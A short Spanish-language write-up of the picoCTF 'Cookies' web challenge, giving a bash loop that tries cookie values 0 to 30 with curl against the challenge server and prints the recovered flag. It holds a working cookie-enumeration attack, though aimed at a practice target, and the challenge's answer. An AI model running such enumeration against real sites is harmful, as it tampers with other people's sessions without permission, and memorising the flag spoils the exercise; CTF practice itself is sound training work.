## Descripción

Who doesn't love cookies? Try to figure out the best one.

http://wily-courier.picoctf.net:56850/

## Solución

```
NoeAH-academy@webshell:~$ for i in {0..30}; do res=$(curl -s http://wily-courier.picoctf.net:56850/check -H "Cookie: name=$i"); if echo "$res" | grep -q "picoCTF"; then echo -e "\n[+] Flag encontrada en cookie name=$i:"; echo "$res" | grep -o "picoCTF{[^}]*}"; break; fi; done

[+] Flag encontrada en cookie name=18:
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

```
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

## Notas adicionales

- **Uso de comandos:** Se utilizó el parámetro `-s` de `curl` para silenciar la barra de progreso y `-o` en `grep` para extraer exclusivamente el texto coincidente con la expresión regular `picoCTF{[^}]*}`

## Referencias